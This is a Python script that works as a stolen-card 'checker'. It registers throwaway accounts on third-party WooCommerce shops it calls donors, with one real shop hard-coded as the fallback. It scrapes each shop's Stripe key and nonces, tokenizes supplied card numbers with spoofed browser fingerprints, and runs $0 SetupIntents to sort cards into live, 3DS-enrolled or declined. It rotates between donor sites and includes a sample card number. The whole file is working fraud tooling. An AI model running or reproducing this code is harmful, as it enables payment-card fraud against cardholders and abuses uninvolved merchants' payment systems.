# language: Python 3.12+, file: setup_gate.py, target: Windows 11, deps: aiohttp
import asyncio
import json
import os
import random
import re
import string
import sys
import time
import uuid
import aiohttp

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
FALLBACK_DONOR = "https://www.blackbeltprotein.com.au"

def rand_str(k=10):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))

def parse_card(raw: str) -> dict:
    parts = raw.strip().split("|")
    number = parts[0].strip()
    mm = parts[1].strip().zfill(2)
    yy = parts[2].strip()
    yy = "20" + yy[-2:] if len(yy) <= 2 else yy
    cvc = parts[3].strip() if len(parts) > 3 else "000"
    return {"number": number, "month": mm, "year": yy, "cvc": cvc, "raw": raw.strip()}

def load_ready_gates() -> list[dict]:
    candidates = ["data/ready_gates.json", "ready_gates.json", "data/active_surfaces.json"]
    for path in candidates:
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    gates = json.load(f)
                    if isinstance(gates, list) and gates:
                        return [g for g in gates if g.get("pk_live")]
            except Exception:
                pass
    return [{
        "domain": "blackbeltprotein.com.au",
        "base_url": FALLBACK_DONOR,
        "reg_url": f"{FALLBACK_DONOR}/my-account/",
        "add_pm_url": f"{FALLBACK_DONOR}/my-account/add-payment-method/",
        "ajax_url": f"{FALLBACK_DONOR}/wp-admin/admin-ajax.php",
        "gate_type": "wc_stripe_upe"
    }]


async def check_card_on_gate(gate_info: dict, s: aiohttp.ClientSession, card_raw: str) -> dict:
    card = parse_card(card_raw)
    mask = f"{card['number'][:6]}******{card['number'][-4:]}"
    base = gate_info.get("base_url", FALLBACK_DONOR).rstrip("/")
    reg_url = gate_info.get("reg_url", f"{base}/my-account/")
    add_pm_url = gate_info.get("add_pm_url", f"{base}/my-account/add-payment-method/")
    ajax_url = gate_info.get("ajax_url", f"{base}/wp-admin/admin-ajax.php")

    # 1. GET /my-account/ to get registration nonce
    try:
        async with s.get(reg_url, ssl=False, timeout=aiohttp.ClientTimeout(total=15)) as r:
            html = await r.text(errors="replace")
    except Exception as e:
        return {"card": card_raw, "status": "ERROR", "detail": f"GET reg failed: {e}", "retry_next_gate": True}

    nonce_m = re.search(r'woocommerce-register-nonce["\']?\s*value=["\']([a-f0-9]{10})["\']', html)
    if not nonce_m:
        return {"card": card_raw, "status": "ERROR", "detail": "Closed reg or captcha on /my-account/", "retry_next_gate": True}
    reg_nonce = nonce_m.group(1)

    # 2. Register temporary account
    uname = rand_str(10)
    email = f"{uname}@mailnesia.com"
    pwd = f"Sec_{rand_str(8)}!9a"
    body = {
        "username": uname,
        "email": email,
        "password": pwd,
        "woocommerce-register-nonce": reg_nonce,
        "_wp_http_referer": "/my-account/",
        "register": "Register"
    }
    post_headers = {
        "Origin": base,
        "Referer": reg_url,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        async with s.post(reg_url, data=body, headers=post_headers, ssl=False, timeout=aiohttp.ClientTimeout(total=15)) as r:
            await r.text(errors="replace")
    except Exception as e:
        return {"card": card_raw, "status": "ERROR", "detail": f"POST reg error: {e}", "retry_next_gate": True}

    cookies = {c.key: c.value for c in s.cookie_jar}
    if not any("wordpress_logged_in" in k for k in cookies):
        return {"card": card_raw, "status": "ERROR", "detail": "Bot challenge blocked login cookie", "retry_next_gate": True}

    # 3. GET /my-account/add-payment-method/
    try:
        async with s.get(add_pm_url, ssl=False, timeout=aiohttp.ClientTimeout(total=15)) as r:
            pm_html = await r.text(errors="replace")
    except Exception as e:
        return {"card": card_raw, "status": "ERROR", "detail": f"GET add-pm error: {e}", "retry_next_gate": True}

    pk_m = re.findall(r'pk_live_[0-9a-zA-Z]{24,}', pm_html)
    pk = pk_m[0] if pk_m else gate_info.get("pk_live", "")
    
    upe_m = re.search(r'createAndConfirmSetupIntentNonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', pm_html)
    upe_nonce = upe_m.group(1) if upe_m else ""
    
    legacy_m = re.search(r'add_card_nonce["\']?\s*[:=]\s*["\']([a-f0-9]{10})["\']', pm_html)
    legacy_nonce = legacy_m.group(1) if legacy_m else ""

    if not pk or (not upe_nonce and not legacy_nonce):
        return {"card": card_raw, "status": "ERROR", "detail": "PK or SetupIntent nonce missing", "retry_next_gate": True}

    # 4. Tokenize via Stripe Elements
    fp = {
        "guid": str(uuid.uuid4()),
        "muid": str(uuid.uuid4()),
        "sid": str(uuid.uuid4())
    }
    tok_body = {
        "type": "card",
        "billing_details[name]": "Alex Vance",
        "billing_details[address][postal_code]": "10001",
        "billing_details[address][country]": "US",
        "card[number]": card["number"],
        "card[cvc]": card["cvc"],
        "card[exp_month]": card["month"],
        "card[exp_year]": card["year"],
        "guid": fp["guid"],
        "muid": fp["muid"],
        "sid": fp["sid"],
        "pasted_fields": "number,cvc",
        "payment_user_agent": "stripe.js/916d815941; stripe-js-v3/916d815941; payment-element; deferred-intent",
        "referrer": base,
        "time_on_page": str(random.randint(20000, 45000)),
        "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "card-element",
        "client_attribution_metadata[merchant_integration_version]": "2017",
        "key": pk,
    }
    tok_headers = {
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "Accept": "application/json"
    }
    try:
        async with s.post("https://api.stripe.com/v1/payment_methods", data=tok_body, headers=tok_headers,
                          ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as r:
            tok_data = await r.json(content_type=None)
    except Exception as e:
        return {"card": card_raw, "status": "ERROR", "detail": f"Stripe tokenize error: {e}", "retry_next_gate": False}

    if "id" not in tok_data:
        err = tok_data.get("error", {}).get("message", str(tok_data))
        return {"card": card_raw, "status": "DECLINED@TOKENIZE", "detail": err, "retry_next_gate": False}

    pm_id = tok_data["id"]

    # 5. Confirm SetupIntent
    ajax_headers = {
        "Origin": base,
        "Referer": add_pm_url,
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json",
    }
    
    if upe_nonce:
        conf_body = {
            "action": "wc_stripe_create_and_confirm_setup_intent",
            "_ajax_nonce": upe_nonce,
            "wc-stripe-payment-method": pm_id,
            "wc-stripe-payment-type": "card",
        }
        target_ajax = ajax_url
    else:
        conf_body = {
            "stripe_source_id": pm_id,
            "nonce": legacy_nonce,
        }
        target_ajax = f"{base}/?wc-ajax=wc_stripe_create_setup_intent"

    try:
        async with s.post(target_ajax, data=conf_body, headers=ajax_headers, ssl=False,
                          timeout=aiohttp.ClientTimeout(total=15)) as r:
            conf_resp = await r.json(content_type=None)
    except Exception as e:
        return {"card": card_raw, "status": "ERROR", "detail": f"SetupIntent confirm network error: {e}", "retry_next_gate": True}

    if conf_resp.get("success") is True or conf_resp.get("status") == "success":
        data = conf_resp.get("data", {})
        st = data.get("status", "succeeded")
        if st == "succeeded":
            return {
                "card": card_raw,
                "status": "APPROVED",
                "detail": f"SetupIntent {data.get('id', '')} Succeeded ($0 auth passed)",
                "retry_next_gate": False
            }
        elif st == "requires_action":
            return {
                "card": card_raw,
                "status": "3DS_REQUIRED",
                "detail": "Card LIVE, enrolled in 3DS (SetupIntent requires OTP action)",
                "retry_next_gate": False
            }
        else:
            return {
                "card": card_raw,
                "status": st.upper(),
                "detail": json.dumps(data),
                "retry_next_gate": False
            }
    else:
        err_msg = ""
        if isinstance(conf_resp.get("data"), dict):
            err_msg = conf_resp["data"].get("error", {}).get("message", "")
        if not err_msg:
            err_msg = conf_resp.get("message", json.dumps(conf_resp))
            
        return {
            "card": card_raw,
            "status": "DECLINED",
            "detail": err_msg,
            "retry_next_gate": False
        }


async def main():
    raw_args = sys.argv[1:]
    custom_donor = None
    if raw_args and raw_args[0].startswith("http"):
        custom_donor = raw_args[0].rstrip("/")
        raw_args = raw_args[1:]

    cards = []
    for a in raw_args:
        if os.path.exists(a):
            with open(a, encoding="utf-8") as f:
                cards.extend([l.strip() for l in f if l.strip() and not l.startswith("#")])
        else:
            cards.append(a.strip())

    if not cards:
        cards = ["5175465382242090|09|2030|018"]

    if custom_donor:
        gates_pool = [{
            "domain": custom_donor.replace("https://", "").replace("http://", ""),
            "base_url": custom_donor,
            "reg_url": f"{custom_donor}/my-account/",
            "add_pm_url": f"{custom_donor}/my-account/add-payment-method/",
            "ajax_url": f"{custom_donor}/wp-admin/admin-ajax.php",
            "gate_type": "wc_stripe_upe"
        }]
    else:
        gates_pool = load_ready_gates()

    print("=" * 80)
    print(f"[*] WOOCOMMERCE STRIPE SETUPINTENT GATE ($0 LIVE ISSUER VALIDATION)")
    print(f"[*] Active Gate Pool: {len(gates_pool)} donors")
    for idx, g in enumerate(gates_pool[:3], 1):
        print(f"    [{idx}] {g.get('domain', g.get('base_url'))}")
    if len(gates_pool) > 3:
        print(f"    ... and {len(gates_pool) - 3} more")
    print(f"[*] Total Cards to Check: {len(cards)}")
    print("=" * 80)

    headers = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9"
    }

    results = []
    gate_idx = 0

    for i, c in enumerate(cards):
        # Attempt across available gates with automatic rotation on donor failure
        res = None
        for attempt in range(len(gates_pool)):
            curr_gate = gates_pool[(gate_idx + attempt) % len(gates_pool)]
            jar = aiohttp.CookieJar(unsafe=True)
            async with aiohttp.ClientSession(headers=headers, cookie_jar=jar) as s:
                res = await check_card_on_gate(curr_gate, s, c)
                if not res.get("retry_next_gate"):
                    gate_idx = (gate_idx + attempt) % len(gates_pool)
                    break
                else:
                    print(f"    [!] Donor {curr_gate.get('domain')} failed ({res['detail']}). Rotating to next donor...", flush=True)

        results.append(res)
        print(f">>> [{res['status']:14}] {res['card']} -> {res['detail']}", flush=True)
        if i < len(cards) - 1:
            await asyncio.sleep(4)

    print("\n" + "=" * 80)
    print("[*] SUMMARY:")
    for r in results:
        print(f"  {r['status']:14} {r['card']:30} {r['detail']}")
    print("=" * 80)


if __name__ == "__main__":
    asyncio.run(main())
